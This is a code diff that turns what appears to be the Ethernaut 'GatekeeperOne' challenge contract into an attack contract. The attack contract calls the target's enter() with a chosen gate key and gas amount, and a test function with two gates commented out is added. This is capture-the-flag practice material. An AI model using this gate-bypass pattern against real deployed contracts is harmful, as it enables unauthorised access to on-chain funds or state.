@@ -1,8 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.21;
 
-contract GatekeeperOne {
-    address public entrant;
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperOneAttack {
+    IGatekeeperOne public challenge;
+
+    constructor(address challengeAddress) {
+        challenge = IGatekeeperOne(challengeAddress);
+    }
+
+    function attack(bytes8 gateKey, uint256 gasToUse) external payable {
+        challenge.enter{gas: gasToUse}(gateKey);
+    }
 
     modifier gateOne() {
         require(msg.sender != tx.origin);
@@ -21,8 +33,13 @@ contract GatekeeperOne {
         _;
     }
 
-    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-        entrant = tx.origin;
+    function testenter(bytes8 _gateKey)
+        public
+        // gateOne
+        // gateTwo
+        gateThree(_gateKey)
+        returns (bool)
+    {
         return true;
     }
 }
